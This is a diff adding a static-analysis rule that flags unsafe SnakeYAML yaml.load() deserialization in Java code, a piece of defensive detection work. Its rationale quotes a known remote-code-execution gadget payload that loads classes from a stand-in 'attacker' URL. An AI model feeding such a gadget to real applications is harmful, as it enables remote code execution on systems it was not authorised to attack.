@@ -1,0 +1,40 @@
+id: ZS-JAVA-029
+lifecycle: released
+name: Unsafe SnakeYAML Deserialization
+version: "1.0.0"
+language: java
+category: deserialization
+severity: high
+confidence: medium
+cwe:
+  - CWE-502
+owasp:
+  - "A08:2025"
+rationale: |
+  SnakeYAML's Yaml.load() (constructed without a SafeConstructor) resolves
+  the !!fully.qualified.ClassName tag syntax into live Java objects,
+  invoking constructors of arbitrary classes on the classpath. A YAML
+  document like !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader
+  [[!!java.net.URL ["http://attacker/"]]]] is a well-known remote code
+  execution gadget, so feeding any attacker-influenced YAML to load() is
+  equivalent to unsafe native deserialization.
+description: |
+  Yaml.load() is called on a SnakeYAML instance. The rule flags the call
+  itself without requiring proven taint (matching how ZS-JAVA-002 flags
+  ObjectInputStream.readObject() unconditionally), because the safe/unsafe
+  distinction lives in the Yaml constructor, which the engine cannot
+  resolve from the call site.
+
+  Known limitation: the callee is a receiver-variable method call, so this
+  rule only fires when the org.yaml.snakeyaml.Yaml variable is
+  conventionally named "yaml". A companion rule for other receiver names is
+  a follow-up.
+message: "yaml.load() detected — SnakeYAML deserializes arbitrary Java types; construct the Yaml with new Yaml(new SafeConstructor()) or use loadAs()"
+references:
+  - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+  - https://cwe.mitre.org/data/definitions/502.html
+tags: [deserialization, yaml, rce]
+match:
+  kind: call
+  callee: yaml.load
+fix_suggestion: "Instantiate SnakeYAML as new Yaml(new SafeConstructor()) so only standard scalar/collection types are constructed, or use yaml.loadAs() with an explicit target class."
